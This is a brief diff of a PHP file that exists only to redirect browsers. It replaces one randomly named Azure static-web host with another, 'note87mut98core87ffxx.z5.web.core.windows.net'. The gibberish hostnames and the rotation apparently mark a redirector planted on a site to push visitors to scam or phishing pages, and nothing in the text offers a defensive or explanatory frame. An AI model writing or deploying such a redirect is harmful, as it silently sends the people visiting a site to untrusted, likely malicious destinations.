@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://quads78for87core77fix.z13.web.core.windows.net/");
+header("Location: https://note87mut98core87ffxx.z5.web.core.windows.net/");
  
 exit;
 ?>
